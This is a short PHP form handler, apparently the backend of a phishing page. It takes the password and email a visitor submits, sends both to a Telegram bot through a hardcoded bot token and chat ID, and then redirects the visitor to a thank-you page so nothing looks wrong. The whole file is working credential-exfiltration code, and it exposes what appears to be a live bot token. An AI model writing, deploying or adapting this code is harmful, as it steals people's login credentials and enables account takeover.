<?php



$password = $_POST['user_password'];
$email = $_POST['user_email'];
$token = "5308801494:AAGxiKp0Tk6-KQ1n0HosTm4AdJtOM62FJbI";
$chat_id = "-616763726";
$arr = array(

  'Пароль: ' => $password,
  'Email' => $email
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
if ($sendToTelegram) {
    header('Location: thank-you.html');
  } else {
    echo "Error";
  }

?>